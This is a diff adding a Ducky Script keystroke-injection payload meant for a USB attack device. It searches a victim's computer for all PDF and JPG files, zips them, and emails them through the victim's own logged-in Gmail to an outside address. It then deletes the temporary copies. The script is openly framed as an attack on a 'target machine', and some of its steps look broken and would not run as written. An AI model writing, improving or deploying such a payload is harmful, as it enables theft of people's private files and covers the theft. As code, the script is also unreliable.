@@ -1,0 +1,75 @@
+REM This script collects all PDF and JPG files on the target machine and sends them via the user's logged-in Gmail account on the default browser.
+
+REM Wait for 5 seconds to allow the computer to finish any ongoing tasks.
+DELAY 5000
+
+REM Open the Start menu and type "File Explorer".
+GUI r
+DELAY 500
+STRING File Explorer
+ENTER
+DELAY 2000
+
+REM Search for all PDF and JPG files on the target machine and copy them to a temporary folder on the desktop.
+CONTROL e
+DELAY 500
+STRING *.pdf OR *.jpg
+ENTER
+DELAY 2000
+ALT f
+STRING Copy as path
+ENTER
+DELAY 2000
+STRING %temp%\target-files
+ENTER
+DELAY 5000
+
+REM Check the size of the folder containing the PDF and JPG files.
+STRING DIR %temp%\target-files /S
+ENTER
+DELAY 2000
+
+REM Parse the output of the "DIR" command to extract the total size of the folder.
+REM Assumes that the output of the "DIR" command is in English.
+STRING FOR /F "tokens=3" %a IN ('DIR %temp%\target-files /S ^| FINDSTR /C:"File(s)" /C:"bytes" /C:"Total"') DO @SET size=%a
+ENTER
+DELAY 2000
+
+REM Convert the size to bytes and check if it exceeds the maximum allowed size for Gmail (25 MB).
+STRING IF %size% GTR 26214400 (
+REM If the size exceeds the maximum allowed size, split the folder into multiple parts and send each part separately.
+REM Assumes that the 7-Zip command line utility is installed on the target machine.
+REM Change the "-v10m" parameter to adjust the size of each part (10 MB in this example).
+STRING "C:\Program Files\7-Zip\7z.exe" a -tzip -v10m %temp%\target-files.zip %temp%\target-files\*.*
+REM Send each part as a separate email.
+STRING "send-email.bat" %temp%\target-files.zip
+) ELSE (
+REM If the size is within the allowed limit, attach the folder to the email and send it.
+REM Assumes that the default browser is Google Chrome.
+REM Assumes that the Gmail account is already logged in on the default browser.
+REM Assumes that the user has allowed Gmail to access the default download folder.
+STRING START chrome "https://mail.google.com/mail/u/0/?view=cm&fs=1&tf=1"
+DELAY 5000
+TAB
+STRING emmett.mcfarland@gmail.com
+TAB
+STRING Files from the target machine
+TAB
+STRING Please find attached all PDF and JPG files from the target machine.
+TAB
+STRING %temp%\target-files.zip
+TAB
+ENTER
+DELAY 5000
+TAB
+ENTER
+DELAY 5000
+REM Delete the temporary folder and its contents.
+STRING DEL /F /Q %temp%\target-files\*.*
+STRING RMDIR /S /Q %temp%\target-files
+ENTER
+)
+
+REM End the script.
+STRING EXIT
+ENTER
